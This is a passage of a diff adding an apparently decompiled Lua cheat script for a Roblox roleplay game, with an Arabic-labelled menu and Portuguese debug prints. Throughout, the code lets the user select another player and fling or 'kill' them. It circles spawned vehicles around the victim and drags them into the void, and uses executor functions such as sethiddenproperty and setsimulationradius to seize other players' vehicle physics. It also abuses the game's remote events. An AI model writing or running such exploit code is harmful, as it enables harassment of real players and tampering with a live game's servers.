+        wait()
+        pcall(v145)
+    end
+end
+
+local u147 = {}
+local u148 = nil
+
+local function u154()
+    u147 = {}
+
+    local v149 = _Players3
+    local v150, v151, v152 = ipairs(v149:GetPlayers())
+
+    while true do
+        local v153
+
+        v152, v153 = v150(v151, v152)
+
+        if v152 == nil then
+            break
+        end
+
+        table.insert(u147, v153.Name)
+    end
+
+    if u148 then
+        u148:Refresh(u147, true)
+    end
+end
+
+u154()
+
+u148 = u77:AddDropdown({
+    Name = '\u{fffd}\u{62e}\u{62a}\u{627}\u{631} \u{627}\u{633}\u{645} \u{627}\u{644}\u{627}\u{639}\u{628}',
+    Default = '',
+    Options = u147,
+    Callback = function(p155)
+        SelectedPlayer = p155
+    end,
+})
+
+u77:AddButton({
+    Name = '\u{fffd}\u{62d}\u{62f}\u{64a}\u{62b} \u{627}\u{644}\u{642}\u{627}\u{626}\u{645}\u{629}',
+    Callback = function()
+        u154()
+    end,
+})
+
+local u158 = u77:AddToggle({
+    Name = ' \u{62a}\u{62e}\u{631}\u{64a}\u{628} \u{628}\u{644} \u{643}\u{646}\u{628}\u{629}',
+    Default = false,
+    Callback = function(p156)
+        if p156 then
+            local v157 = SelectedPlayer and GetPlayer(SelectedPlayer)[1]
+
+            if v157 then
+                u146(v157)
+            end
+        else
+            getgenv().flingloop = false
+        end
+    end,
+})
+
+game:GetService('Players').LocalPlayer.Character.Humanoid:GetPropertyChangedSignal('Sit'):Connect(function()
+    if _LocalPlayer2.Character.Humanoid.Sit and u158 then
+        u158:Set(false)
+    end
+end)
+u77:AddSection({
+    Name = '\u{fffd}\u{62e}\u{631}\u{64a}\u{628} \u{628}\u{644} \u{628}\u{627}\u{635}',
+})
+
+local u160 = u77:AddDropdown({
+    Name = '\u{fffd}\u{62e}\u{62a}\u{627}\u{631} \u{627}\u{644}\u{627}\u{639}\u{628} \u{627}\u{644}\u{630}\u{64a} \u{62a}\u{631}\u{64a}\u{62f} \u{62a}\u{62e}\u{631}\u{64a}\u{628} \u{639}\u{644}\u{64a}\u{647} \u{628}\u{644} \u{628}\u{627}\u{635}',
+    Options = {},
+    Callback = function(p159)
+        selectedPlayerName = p159
+    end,
+})
+
+local function u166()
+    playerNames = {}
+
+    local v161 = _Players3
+    local v162, v163, v164 = pairs(v161:GetPlayers())
+
+    while true do
+        local v165
+
+        v164, v165 = v162(v163, v164)
+
+        if v164 == nil then
+            break
+        end
+
+        table.insert(playerNames, v165.Name)
+    end
+
+    u160:Refresh(playerNames, true)
+end
+
+u77:AddButton({
+    Name = '\u{fffd}\u{62f}\u{62b} \u{627}\u{644}\u{642}\u{627}\u{626}\u{645}\u{629}',
+    Callback = function()
+        u166()
+    end,
+})
+u166()
+u77:AddToggle({
+    Name = '\u{fffd}\u{62a}\u{644} \u{644}\u{627}\u{639}\u{628}',
+    Callback = function()
+        if selectedPlayerName then
+            local _LocalPlayer4 = _Players3.LocalPlayer
+            local u168 = _LocalPlayer4.Character or _LocalPlayer4.CharacterAdded:Wait()
+            local _HumanoidRootPart3 = u168:WaitForChild('HumanoidRootPart')
+
+            originalPosition = _HumanoidRootPart3.CFrame
+
+            local function v171()
+                local _Vehicles = Workspace:FindFirstChild('Vehicles')
+
+                if _Vehicles then
+                    return _Vehicles:FindFirstChild(_LocalPlayer4.Name .. 'Car')
+                else
+                    return nil
+                end
+            end
+
+            local u172 = v171()
+
+            if not u172 then
+                _HumanoidRootPart3.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
+
+                task.wait(0.5)
+
+                local _RE = ReplicatedStorage:FindFirstChild('RE')
+
+                if _RE and _RE:FindFirstChild('1Ca1r') then
+                    _RE['1Ca1r']:FireServer('PickingCar', 'SchoolBus')
+                end
+
+                task.wait(1)
+
+                u172 = v171()
+            end
+            if u172 then
+                local _Body = u172:FindFirstChild('Body')
+
+                if _Body then
+                    _Body = u172.Body:FindFirstChild('VehicleSeat')
+                end
+                if _Body and (u168:FindFirstChildOfClass('Humanoid') and not u168.Humanoid.Sit) then
+                    repeat
+                        _HumanoidRootPart3.CFrame = _Body.CFrame * CFrame.new(0, 2, 0)
+
+                        task.wait()
+                    until u168.Humanoid.Sit or not u172.Parent
+                end
+
+                local function v183()
+                    while true do
+                        if selectedPlayerName then
+                            local v175 = _Players3:FindFirstChild(selectedPlayerName)
+
+                            if v175 and v175.Character and v175.Character:FindFirstChild('HumanoidRootPart') then
+                                local _Humanoid = v175.Character:FindFirstChildOfClass('Humanoid')
+
+                                if _Humanoid and _Humanoid.Sit then
+                                    if u168.Humanoid then
+                                        u172:SetPrimaryPartCFrame(CFrame.new(destination))
+                                        print('Jogador sentou, levando \u{f4}nibus para o void!')
+                                        task.wait(0.2)
+
+                                        local function v178()
+                                            local _Character3 = _LocalPlayer4.Character
+
+                                            if _Character3 then
+                                                _Character3 = _LocalPlayer4.Character:FindFirstChildWhichIsA('Humanoid')
+                                            end
+                                            if _Character3 then
+                                                _Character3:ChangeState(Enum.HumanoidStateType.Jumping)
+                                            end
+                                        end
+
+                                        v178()
+                                        print('Simulando pulo!')
+                                        task.wait(0.4)
+                                        v178()
+                                        task.wait(0.5)
+
+                                        _HumanoidRootPart3.CFrame = originalPosition
+
+                                        print('Player voltou para a posi\u{e7}\u{e3}o inicial!')
+                                    end
+
+                                    return
+                                end
+
+                                local _HumanoidRootPart4 = v175.Character.HumanoidRootPart
+                                local v180 = tick() * 35
+                                local v181 = math.sin(v180) * 4
+                                local v182 = math.cos(v180) * 20
+
+                                u172:SetPrimaryPartCFrame(_HumanoidRootPart4.CFrame * CFrame.new(v181, 0, v182))
+                            end
+                        end
+
+                        RunService.RenderStepped:Wait()
+                    end
+                end
+
+                spawn(v183)
+            end
+        else
+            print('Nenhum jogador selecionado!')
+        end
+    end,
+})
+u77:AddButton({
+    Name = '\u{fffd}\u{62d}\u{628} \u{627}\u{644}\u{627}\u{639}\u{628}',
+    Callback = function()
+        if selectedPlayerName then
+            local _LocalPlayer5 = _Players3.LocalPlayer
+            local u185 = _LocalPlayer5.Character or _LocalPlayer5.CharacterAdded:Wait()
+            local _HumanoidRootPart5 = u185:WaitForChild('HumanoidRootPart')
+
+            originalPosition = _HumanoidRootPart5.CFrame
+
+            local function v188()
+                local _Vehicles2 = Workspace:FindFirstChild('Vehicles')
+
+                if _Vehicles2 then
+                    return _Vehicles2:FindFirstChild(_LocalPlayer5.Name .. 'Car')
+                else
+                    return nil
+                end
+            end
+
+            local u189 = v188()
+
+            if not u189 then
+                _HumanoidRootPart5.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
+
+                task.wait(0.5)
+
+                local _RE2 = ReplicatedStorage:FindFirstChild('RE')
+
+                if _RE2 and _RE2:FindFirstChild('1Ca1r') then
+                    _RE2['1Ca1r']:FireServer('PickingCar', 'SchoolBus')
+                end
+
+                task.wait(1)
+
+                u189 = v188()
+            end
+            if u189 then
+                local _Body2 = u189:FindFirstChild('Body')
+
+                if _Body2 then
+                    _Body2 = u189.Body:FindFirstChild('VehicleSeat')
+                end
+                if _Body2 and (u185:FindFirstChildOfClass('Humanoid') and not u185.Humanoid.Sit) then
+                    repeat
+                        _HumanoidRootPart5.CFrame = _Body2.CFrame * CFrame.new(0, 2, 0)
+
+                        task.wait()
+                    until u185.Humanoid.Sit or not u189.Parent
+                end
+
+                local function v199()
+                    while true do
+                        if selectedPlayerName then
+                            local v192 = _Players3:FindFirstChild(selectedPlayerName)
+
+                            if v192 and v192.Character and v192.Character:FindFirstChild('HumanoidRootPart') then
+                                local _Humanoid2 = v192.Character:FindFirstChildOfClass('Humanoid')
+
+                                if _Humanoid2 and _Humanoid2.Sit then
+                                    if u185.Humanoid then
+                                        u189:SetPrimaryPartCFrame(originalPosition)
+                                        print('Jogador sentou, trazendo \u{f4}nibus para a posi\u{e7}\u{e3}o inicial!')
+                                        task.wait(0.2);
+                                        (function()
+                                            local _Character4 = _LocalPlayer5.Character
+
+                                            if _Character4 then
+                                                _Character4 = _LocalPlayer5.Character:FindFirstChildWhichIsA('Humanoid')
+                                            end
+                                            if _Character4 then
+                                                _Character4:ChangeState(Enum.HumanoidStateType.Jumping)
+                                            end
+                                        end)()
+                                        task.wait(0.2)
+
+                                        _HumanoidRootPart5.CFrame = originalPosition
+
+                                        print('Player voltou para a posi\u{e7}\u{e3}o inicial!')
+                                        game:GetService('ReplicatedStorage'):WaitForChild('RE'):WaitForChild('1Ca1r'):FireServer(unpack({
+                                            'DeleteAllVehicles',
+                                        }))
+                                    end
+
+                                    return
+                                end
+
+                                local _HumanoidRootPart6 = v192.Character.HumanoidRootPart
+                                local v196 = tick() * 35
+                                local v197 = math.sin(v196) * 4
+                                local v198 = math.cos(v196) * 20
+
+                                u189:SetPrimaryPartCFrame(_HumanoidRootPart6.CFrame * CFrame.new(v197, 0, v198))
+                            end
+                        end
+
+                        RunService.RenderStepped:Wait()
+                    end
+                end
+
+                spawn(v199)
+            end
+        else
+            print('Nenhum jogador selecionado!')
+        end
+    end,
+})
+u77:AddSection({
+    Name = '\u{fffd}\u{62a}\u{644} \u{633}\u{641}\u{64a}\u{646}\u{629}',
+})
+u77:AddSection({
+    Name = '\u{fffd}\u{644}\u{627}\u{62d}\u{636}\u{629} \u{627}\u{635}\u{639}\u{62f} \u{633}\u{641}\u{64a}\u{646}\u{647} \u{628}\u{639}\u{62f}\u{64a}\u{646} \u{627}\u{642}\u{62a}\u{644} \u{634}\u{62e}\u{635} \u{639}\u{634}\u{627}\u{646} \u{64a}\u{636}\u{628}\u{637}',
+})
+
+local _ = false
+local _ = game:GetService('RunService')
+
+local function _(p200, p201)
+    local v202, v203, v204 = ipairs(p200:GetDescendants())
+
+    while true do
+        local v205
+
+        v204, v205 = v202(v203, v204)
+
+        if v204 == nil then
+            break
+        end
+        if v205:IsA('BasePart') then
+            v205.CanCollide = p201
+        end
+    end
+end
+
+local _Players5 = game:GetService('Players')
+local _Workspace = game:GetService('Workspace')
+
+game:GetService('RunService')
+
+local _ReplicatedStorage = game:GetService('ReplicatedStorage')
+
+Vector3.new(265.46, -450.83, -59.93)
+
+local v209, v210, v211 = pairs(_Players5:GetPlayers())
+local u212 = u69
+local u213 = u154
+local v214 = {}
+local u215 = nil
+
+while true do
+    local v216
+
+    v211, v216 = v209(v210, v211)
+
+    if v211 == nil then
+        break
+    end
+
+    table.insert(v214, v216.Name)
+end
+
+local u217 = nil
+
+u77:AddDropdown({
+    Name = '\u{fffd}\u{627}\u{62e}\u{640}\u{62a}\u{640}\u{627}\u{631} \u{627}\u{644}\u{640}\u{644}\u{627}\u{639}\u{640}\u{628}\u{3a9}',
+    Options = v214,
+    Callback = function(p218)
+        u217 = p218
+    end,
+})
+u77:AddButton({
+    Name = '\u{fffd}\u{62d}\u{62f}\u{64a}\u{62b} \u{627}\u{644}\u{642}\u{627}\u{626}\u{645}\u{629}',
+    Callback = function()
+        u213()
+    end,
+})
+u77:AddButton({
+    Name = '\u{fffd}\u{62a}\u{644} \u{644}\u{627}\u{639}\u{628}',
+    Callback = function()
+        if u217 then
+            local _LocalPlayer6 = _Players5.LocalPlayer
+            local _HumanoidRootPart7 = (_LocalPlayer6.Character or _LocalPlayer6.CharacterAdded:Wait()):WaitForChild('HumanoidRootPart')
+
+            u215 = _HumanoidRootPart7.CFrame
+
+            if not (function()
+                local _Vehicles3 = _Workspace:FindFirstChild('Vehicles')
+
+                if _Vehicles3 then
+                    return _Vehicles3:FindFirstChild(_LocalPlayer6.Name .. 'Car')
+                else
+                    return nil
+                end
+            end)() then
+                _HumanoidRootPart7.CFrame = CFrame.new(25.9511604, 4.09631968, 1581.40173, 0.0186735559, -3.64394381e-8, 0.999825656, -8.918153329999999e-9, 1, 3.66123558e-8, -0.999825656, -9.60028146e-9, 0.0186735559)
+
+                task.wait(0.5)
+
+                local _RE3 = _ReplicatedStorage:FindFirstChild('RE')
+
+                if _RE3 and _RE3:FindFirstChild('1Ca1r') then
+                    RemoteEvent['1Ca1r']:FireServer('PickingBoat', 'PirateFree')
+                end
+
+                task.wait(1)
+
+                PCar = GetCar()
+            end
+            if PCar then
+                local _Body3 = PCar:FindFirstChild('Body')
+
+                if _Body3 then
+                    _Body3 = PCar.Body:FindFirstChild('VehicleSeat')
+                end
+                if _Body3 and not Humanoid.Sit then
+                    repeat
+                        RootPart.CFrame = _Body3.CFrame * CFrame.new(0, math.random(-1, 1), 0)
+
+                        task.wait()
+                    until Humanoid.Sit or not PCar.Parent
+                end
+            end
+
+            wait(0.2)
+            game:GetService('UserInputService')
+
+            local _RunService = game:GetService('RunService')
+            local u225 = _Players5.LocalPlayer:GetMouse()
+            local _Folder = Instance.new('Folder', game:GetService('Workspace'))
+            local _Part = Instance.new('Part', _Folder)
+            local _Attachment = Instance.new('Attachment', _Part)
+
+            _Part.Anchored = true
+            _Part.CanCollide = false
+            _Part.Transparency = 1
+
+            local v233 = coroutine.create(function()
+                settings().Physics.AllowSleep = false
+
+                while _RunService.RenderStepped:Wait() do
+                    local v229 = next
+                    local v230, v231 = _Players5:GetPlayers()
+
+                    while true do
+                        local v232
+
+                        v231, v232 = v229(v230, v231)
+
+                        if v231 == nil then
+                            break
+                        end
+                        if v232 ~= _Players5.LocalPlayer then
+                            v232.MaximumSimulationRadius = 0
+
+                            sethiddenproperty(v232, 'SimulationRadius', 2)
+                        end
+                    end
+
+                    _Players5.LocalPlayer.MaximumSimulationRadius = math.pow(math.huge, math.huge)
+
+                    setsimulationradius(math.huge)
+                end
+            end)
+
+            coroutine.resume(v233)
+
+            local function u246(p234)
+                if p234:IsA('Model') and p234:FindFirstChildOfClass('VehicleSeat') then
+                    u225.TargetFilter = p234
+
+                    local v235 = next
+                    local v236, v237 = p234:GetDescendants()
+
+                    while true do
+                        local v238
+
+                        v237, v238 = v235(v236, v237)
+
+                        if v237 == nil then
+                            break
+                        end
+                        if v238:IsA('BodyAngularVelocity') or (v238:IsA('BodyForce') or (v238:IsA('BodyGyro') or (v238:IsA('BodyPosition') or (v238:IsA('BodyThrust') or (v238:IsA('BodyVelocity') or v238:IsA('RocketPropulsion')))))) then
+                            v238:Destroy()
+                        end
+                    end
+
+                    if p234:FindFirstChild('Attachment') then
+                        p234:FindFirstChild('Attachment'):Destroy()
+                    end
+                    if p234:FindFirstChild('AlignPosition') then
+                        p234:FindFirstChild('AlignPosition'):Destroy()
+                    end
+                    if p234:FindFirstChild('Torque') then
+                        p234:FindFirstChild('Torque'):Destroy()
+                    end
+
+                    local v239 = next
+                    local v240, v241 = p234:GetDescendants()
+
+                    while true do
+                        local v242
+
+                        v241, v242 = v239(v240, v241)
+
+                        if v241 == nil then
+                            break
+                        end
+                        if v242:IsA('BasePart') then
+                            v242.CanCollide = false
+
+                            local _Torque = Instance.new('Torque', v242)
+
+                            _Torque.Torque = Vector3.new(102000, 10200000, 120000)
+
+                            local _AlignPosition = Instance.new('AlignPosition', v242)
+                            local _Attachment2 = Instance.new('Attachment', v242)
+
+                            _Torque.Attachment0 = _Attachment2
+                            _AlignPosition.MaxForce = 99999
+                            _AlignPosition.MaxVelocity = math.huge
+                            _AlignPosition.Responsiveness = 200
+                            _AlignPosition.Attachment0 = _Attachment2
+                            _AlignPosition.Attachment1 = _Attachment
+                        end
+                    end
+                end
+            end
+
+            local v247 = next
+            local v248, v249 = game:GetService('Workspace'):GetDescendants()
+            local u250 = _RunService
+            local u251 = _Attachment
+
+            while true do
+                local v252
+
+                v249, v252 = v247(v248, v249)
+
+                if v249 == nil then
+                    break
+                end
+
+                u246(v252)
+            end
+
+            game:GetService('Workspace').DescendantAdded:Connect(function(p253)
+                u246(p253)
+            end)
+            spawn(function()
+                while true do
+                    if u217 then
+                        local v254 = _Players5:FindFirstChild(u217)
+
+                        if v254 and v254.Character and v254.Character:FindFirstChild('HumanoidRootPart') then
+                            u251.WorldCFrame = v254.Character.HumanoidRootPart.CFrame
+                        end
+                    end
+
+                    u250.RenderStepped:Wait()
+                end
+            end)
+            wait(4)
+
+            local u255 = Vector3.new(101, -446, -180)
+
+            _LocalPlayer6.Character.HumanoidRootPart.CFrame = CFrame.new(u255)
+
+            local function u258(p256)
+                if p256 and p256.Character then
+                    local _Humanoid3 = p256.Character:FindFirstChild('Humanoid')
+
+                    if _Humanoid3 and _Humanoid3.SeatPart and _Humanoid3.SeatPart.Parent:IsA('VehicleSeat') then
+                        p256.Character.HumanoidRootPart.CFrame = CFrame.new(u255)
+                    end
+                end
+            end
+
+            game:GetService('Players').PlayerAdded:Connect(function(p259)
+                if p259.Name == u217 then
+                    p259.CharacterAdded:Connect(function(p260)
+                        p260:WaitForChild('Humanoid').Seated:Connect(function(_, p261)
+                            if p261 then
+                                u258(p259)
+                            end
+                        end)
+                    end)
+                end
+            end)
+        else
+            print('Nenhum jogador selecionado!')
+        end
+    end,
+})
+u77:AddSection({
+    Name = '\u{fffd}\u{62a}\u{644} \u{634}\u{627}\u{62d}\u{646}\u{629} \u{627}\u{644}\u{633}\u{648}\u{62f}\u{627}\u{621}',
+})
+u77:AddSection({
+    Name = '\u{fffd}\u{644}\u{627}\u{62d}\u{636}\u{629} \u{627}\u{635}\u{639}\u{62f} \u{627}\u{644}\u{634}\u{627}\u{62d}\u{646}\u{629} \u{628}\u{639}\u{62f}\u{64a}\u{646} \u{627}\u{642}\u{62a}\u{644} \u{634}\u{62e}\u{635} \u{639}\u{634}\u{627}\u{646} \u{64a}\u{636}\u{628}\u{637}',
+})
+
+local _ = false
+local _ = game:GetService('RunService')
+
+local function _(p262, p263)
+    local v264, v265, v266 = ipairs(p262:GetDescendants())
+
+    while true do
+        local v267
+
+        v266, v267 = v264(v265, v266)
+
+        if v266 == nil then
+            break
+        end
+        if v267:IsA('BasePart') then
+            v267.CanCollide = p263
+        end
+    end
+end
+
+local _Players6 = game:GetService('Players')
+local _Workspace2 = game:GetService('Workspace')
+
+game:GetService('RunService')
+
+local _ReplicatedStorage2 = game:GetService('ReplicatedStorage')
+
+Vector3.new(265.46, -450.83, -59.93)
+
+local v271, v272, v273 = pairs(_Players6:GetPlayers())
+local v274 = {}
+local u275 = nil
+
+while true do
+    local v276
+
+    v273, v276 = v271(v272, v273)
+
+    if v273 == nil then
+        break
+    end
+
+    table.insert(v274, v276.Name)
+end
+
+local u277 = nil
+
+u77:AddDropdown({
+    Name = '\u{fffd}\u{62e}\u{640}\u{62a}\u{640}\u{627}\u{631} \u{627}\u{644}\u{640}\u{644}\u{627}\u{639}\u{640}\u{628}',
+    Options = v274,
+    Callback = function(p278)
+        u277 = p278
+    end,
+})
+u77:AddButton({
+    Name = '\u{fffd}\u{62d}\u{62f}\u{64a}\u{62b} \u{627}\u{644}\u{642}\u{627}\u{626}\u{645}\u{629}',
+    Callback = function()
+        u213()
+    end,
+})
+u77:AddButton({
+    Name = '\u{fffd}\u{62a}\u{644} \u{644}\u{627}\u{639}\u{628}',
+    Callback = function()
+        if u277 then
+            local _LocalPlayer7 = _Players6.LocalPlayer
+            local _HumanoidRootPart8 = (_LocalPlayer7.Character or _LocalPlayer7.CharacterAdded:Wait()):WaitForChild('HumanoidRootPart')
+
+            u275 = _HumanoidRootPart8.CFrame
+
+            if not (function()
+                local _Vehicles4 = _Workspace2:FindFirstChild('Vehicles')
+
+                if _Vehicles4 then
+                    return _Vehicles4:FindFirstChild(_LocalPlayer7.Name .. 'Car')
+                else
+                    return nil
+                end
+            end)() then
+                _HumanoidRootPart8.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
+
+                task.wait(0.5)
+
+                local _RE4 = _ReplicatedStorage2:FindFirstChild('RE')
+
+                if _RE4 and _RE4:FindFirstChild('1Ca1r') then
+                    _RE4['1Ca1r']:FireServer('PickingCar', 'TowTruck')
+                end
+
+                task.wait(1)
+
+                PCar = GetCar()
+            end
+            if PCar then
+                local _Body4 = PCar:FindFirstChild('Body')
+
+                if _Body4 then
+                    _Body4 = PCar.Body:FindFirstChild('VehicleSeat')
+                end
+                if _Body4 and not Humanoid.Sit then
+                    repeat
+                        RootPart.CFrame = _Body4.CFrame * CFrame.new(0, math.random(-1, 1), 0)
+
+                        task.wait()
+                    until Humanoid.Sit or not PCar.Parent
+                end
+            end
+
+            wait(0.2)
+            game:GetService('UserInputService')
+
+            local _RunService2 = game:GetService('RunService')
+            local u285 = _Players6.LocalPlayer:GetMouse()
+            local _Folder2 = Instance.new('Folder', game:GetService('Workspace'))
+            local _Part2 = Instance.new('Part', _Folder2)
+            local _Attachment3 = Instance.new('Attachment', _Part2)
+
+            _Part2.Anchored = true
+            _Part2.CanCollide = false
+            _Part2.Transparency = 1
+
+            local v293 = coroutine.create(function()
+                settings().Physics.AllowSleep = false
+
+                while _RunService2.RenderStepped:Wait() do
+                    local v289 = next
+                    local v290, v291 = _Players6:GetPlayers()
+
+                    while true do
+                        local v292
+
+                        v291, v292 = v289(v290, v291)
+
+                        if v291 == nil then
+                            break
+                        end
+                        if v292 ~= _Players6.LocalPlayer then
+                            v292.MaximumSimulationRadius = 0
+
+                            sethiddenproperty(v292, 'SimulationRadius', 2)
+                        end
+                    end
+
+                    _Players6.LocalPlayer.MaximumSimulationRadius = math.pow(math.huge, math.huge)
+
+                    setsimulationradius(math.huge)
+                end
+            end)
+
+            coroutine.resume(v293)
+
+            local function u306(p294)
+                if p294:IsA('Model') and p294:FindFirstChildOfClass('VehicleSeat') then
+                    u285.TargetFilter = p294
+
+                    local v295 = next
+                    local v296, v297 = p294:GetDescendants()
+
+                    while true do
+                        local v298
+
+                        v297, v298 = v295(v296, v297)
+
+                        if v297 == nil then
+                            break
+                        end
+                        if v298:IsA('BodyAngularVelocity') or (v298:IsA('BodyForce') or (v298:IsA('BodyGyro') or (v298:IsA('BodyPosition') or (v298:IsA('BodyThrust') or (v298:IsA('BodyVelocity') or v298:IsA('RocketPropulsion')))))) then
+                            v298:Destroy()
+                        end
+                    end
+
+                    if p294:FindFirstChild('Attachment') then
+                        p294:FindFirstChild('Attachment'):Destroy()
+                    end
+                    if p294:FindFirstChild('AlignPosition') then
+                        p294:FindFirstChild('AlignPosition'):Destroy()
+                    end
+                    if p294:FindFirstChild('Torque') then
+                        p294:FindFirstChild('Torque'):Destroy()
+                    end
+
+                    local v299 = next
+                    local v300, v301 = p294:GetDescendants()
+
+                    while true do
+                        local v302
+
+                        v301, v302 = v299(v300, v301)
+
+                        if v301 == nil then
+                            break
+                        end
+                        if v302:IsA('BasePart') then
+                            v302.CanCollide = false
+
+                            local _Torque2 = Instance.new('Torque', v302)
+
+                            _Torque2.Torque = Vector3.new(102000, 10200000, 120000)
+
+                            local _AlignPosition2 = Instance.new('AlignPosition', v302)
+                            local _Attachment4 = Instance.new('Attachment', v302)
+
+                            _Torque2.Attachment0 = _Attachment4
+                            _AlignPosition2.MaxForce = 99999
+                            _AlignPosition2.MaxVelocity = math.huge
+                            _AlignPosition2.Responsiveness = 200
+                            _AlignPosition2.Attachment0 = _Attachment4
+                            _AlignPosition2.Attachment1 = _Attachment3
+                        end
+                    end
+                end
+            end
+
+            local v307 = next
+            local v308, v309 = game:GetService('Workspace'):GetDescendants()
+            local u310 = _RunService2
+            local u311 = _Attachment3
+
+            while true do
+                local v312
+
+                v309, v312 = v307(v308, v309)
+
+                if v309 == nil then
+                    break
+                end
+
+                u306(v312)
+            end
+
+            game:GetService('Workspace').DescendantAdded:Connect(function(p313)
+                u306(p313)
+            end)
+            spawn(function()
+                while true do
+                    if u277 then
+                        local v314 = _Players6:FindFirstChild(u277)
+
+                        if v314 and v314.Character and v314.Character:FindFirstChild('HumanoidRootPart') then
+                            u311.WorldCFrame = v314.Character.HumanoidRootPart.CFrame
+                        end
+                    end
+
+                    u310.RenderStepped:Wait()
+                end
+            end)
+            wait(4)
+
+            local u315 = Vector3.new(101, -446, -180)
+
+            _LocalPlayer7.Character.HumanoidRootPart.CFrame = CFrame.new(u315)
+
+            local function u318(p316)
+                if p316 and p316.Character then
+                    local _Humanoid4 = p316.Character:FindFirstChild('Humanoid')
+
+                    if _Humanoid4 and _Humanoid4.SeatPart and _Humanoid4.SeatPart.Parent:IsA('VehicleSeat') then
+                        p316.Character.HumanoidRootPart.CFrame = CFrame.new(u315)
+                    end
+                end
+            end
+
+            game:GetService('Players').PlayerAdded:Connect(function(p319)
+                if p319.Name == u277 then
+                    p319.CharacterAdded:Connect(function(p320)
+                        p320:WaitForChild('Humanoid').Seated:Connect(function(_, p321)
+                            if p321 then
+                                u318(p319)
+                            end
+                        end)
+                    end)
+                end
+            end)
+        else
+            print('Nenhum jogador selecionado!')
+        end
+    end,
+})
+u77:AddSection({
+    Name = '\u{fffd}\u{62a}\u{644} \u{628}\u{64a}\u{62a} \u{648}\u{633}\u{64a}\u{627}\u{631}\u{629}',
+});
+(function()
+    local v322, v323, v324 = pairs(game.Players:GetPlayers())
+    local v325 = {}
+
+    while true do
+        local v326
+
+        v324, v326 = v322(v323, v324)
+
+        if v324 == nil then
+            break
+        end
+
+        table.insert(v325, v326.Name)
+    end
+
+    u77:AddDropdown({
+        Name = '\u{fffd}\u{62e}\u{62a}\u{627}\u{631} \u{627}\u{633}\u{645} \u{627}\u{644}\u{645}\u{631}\u{62d}\u{648}\u{645}',
+        Default = v325[1],
+        Options = v325,
+        Callback = function(p327)
+            selectedPlayer = game.Players:FindFirstChild(p327)
+
+            print('Jogador selecionado: ' .. p327)
+        end,
+    })
+end)()
+u77:AddButton({
+    Name = '\u{fffd}\u{62a}\u{62d}\u{62f}\u{64a}\u{62b} \u{627}\u{644}\u{642}\u{627}\u{626}\u{645}\u{629}\u{3a9}',
+    Callback = function()
+        u213()
+    end,
+})
+u77:AddButton({
+    Name = '\u{fffd}\u{62a}\u{644} \u{628}\u{64a}\u{62a} \u{648}\u{633}\u{64a}\u{627}\u{631}\u{647}',
+    Callback = function()
+        local _LocalPlayer8 = game.Players.LocalPlayer
+        local _ = _LocalPlayer8.Backpack
+        local _Character5 = _LocalPlayer8.Character
+        local v330 = _Character5
+        local u331 = _Character5.FindFirstChildOfClass(v330, 'Humanoid')
+        local v332 = _Character5
+        local u333 = _Character5.FindFirstChild(v332, 'HumanoidRootPart')
+        local __001_Lots = game.Workspace:FindFirstChild('001_Lots')
+        local _ = u333.CFrame
+        local v335 = 0
+        local _Vehicles5 = _Workspace2.Vehicles
+
+        function Check()
+            return _LocalPlayer8 and (_Character5 and (u331 and (u333 and _Vehicles5))) and true or false
+        end
+
+        if selectedPlayer and (selectedPlayer.Character and Check()) then
+            if not __001_Lots:FindFirstChild(_LocalPlayer8.Name .. 'House') then
+                local v337, v338, v339 = pairs(__001_Lots:GetChildren())
+                local v340 = nil
+
+                while true do
+                    local v341
+
+                    v339, v341 = v337(v338, v339)
+
+                    if v339 == nil then
+                        break
+                    end
+                    if v341.Name == 'For Sale' then
+                        local v342, v343, v344 = pairs(v341:GetDescendants())
+
+                        while true do
+                            local v345
+
+                            v344, v345 = v342(v343, v344)
+
+                            if v344 == nil then
+                                break
+                            end
+                            if v345:IsA('NumberValue') and (v345.Name == 'Number' and (v345.Value < 25 and v345.Value > 10)) then
+                                v340 = v341
+
+                                break
+                            end
+                        end
+                    end
+                end
+
+                local _BuyHouse = v340:FindFirstChild('BuyHouse')
+                local _ = _BuyHouse.Position
+
+                if _BuyHouse and _BuyHouse:IsA('BasePart') then
+                    u333.CFrame = _BuyHouse.CFrame + Vector3.new(0, -6, 0)
+
+                    task.wait(0.5)
+
+                    local _ClickDetector = _BuyHouse:FindFirstChild('ClickDetector')
+
+                    if _ClickDetector then
+                        fireclickdetector(_ClickDetector)
+                    end
+                end
+            end
+
+            task.wait(0.5)
+
+            local v348 = __001_Lots:FindFirstChild(_LocalPlayer8.Name .. 'House')
+
+            if v348 then
+                task.wait(0.5)
+
+                local v349, v350, v351 = pairs(v348:GetDescendants())
+                local v352 = nil
+
+                while true do
+                    local v353
+
+                    v351, v353 = v349(v350, v351)
+
+                    if v351 == nil then
+                        break
+                    end
+                    if v353.Name == 'Number' then
+                        if v353:IsA('NumberValue') then
+                            v352 = v353
+                        end
+                    end
+                end
+
+                task.wait(0.5)
+                game:GetService('ReplicatedStorage').RE:FindFirstChild('1Gettin1gHous1e'):FireServer('PickingCustomHouse', '049_House', v352.Value)
+            end
+
+            task.wait(0.5)
+
+            local v354 = _Vehicles5
+
+            if not _Vehicles5.FindFirstChild(v354, _LocalPlayer8.Name .. 'Car') and Check() then
+                u333.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
+
+                task.wait(0.5)
+                game:GetService('ReplicatedStorage').RE:FindFirstChild('1Ca1r'):FireServer('PickingCar', 'SchoolBus')
+                task.wait(0.5)
+
+                local v355 = _Vehicles5
+                local v356 = _Vehicles5.FindFirstChild(v355, _LocalPlayer8.Name .. 'Car')
+
+                task.wait(0.5)
+
+                local _Body5 = v356:FindFirstChild('Body')
+
+                if _Body5 then
+                    _Body5 = v356.Body:FindFirstChild('VehicleSeat')
+                end
+                if _Body5 then
+                    repeat
+                        task.wait()
+
+                        u333.CFrame = _Body5.CFrame * CFrame.new(0, math.random(-1, 1), 0)
+                    until u331.Sit
+                end
+            end
+
+            task.wait(0.5)
+
+            local v358 = _Vehicles5
+            local u359 = _Vehicles5.FindFirstChild(v358, _LocalPlayer8.Name .. 'Car')
+
+            if u359 then
+                if not u331.Sit then
+                    local _Body6 = u359:FindFirstChild('Body')
+
+                    if _Body6 then
+                        _Body6 = u359.Body:FindFirstChild('VehicleSeat')
+                    end
+                    if _Body6 then
+                        repeat
+                            task.wait()
+
+                            u333.CFrame = _Body6.CFrame * CFrame.new(0, math.random(-1, 1), 0)
+                        until u331.Sit
+                    end
+                end
+
+                local _Character6 = selectedPlayer.Character
+                local _Humanoid5 = _Character6:FindFirstChildOfClass('Humanoid')
